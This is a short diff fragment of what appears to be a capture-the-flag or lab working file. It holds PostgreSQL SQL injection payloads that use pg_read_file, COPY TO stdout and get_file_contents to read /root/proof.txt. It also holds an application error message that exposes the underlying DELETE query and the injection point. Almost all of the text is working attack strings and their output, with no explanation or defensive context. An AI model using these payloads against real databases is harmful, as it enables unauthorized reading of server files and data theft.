@@ -16,3 +16,6 @@
 '; SELECT pg_read_file('/root/proof.txt'); --
 '; COPY (SELECT content FROM (SELECT pg_read_file('/root/proof.txt') as content) t) TO stdout; --
 '; SELECT pg_read_file('/root/proof.txt'); --
+
+'+select+get_file_contents('/root/proof.txt')%3b
+"An error occurred. StatementCallback; bad SQL grammar [DELETE FROM notes WHERE id = 'dda1b358-776a-409e-b4eb-4622a1b0f384' select get_file_contents('/root/proof.txt');';]; nested exception is org.postgresql.util.PSQLException: Unterminated string literal started at position 112 in SQL DELETE FROM notes WHERE id = 'dda1b358-776a-409e-b4eb-4622a1b0f384' select get_file_contents('/root/proof.txt');';. Expected  char"
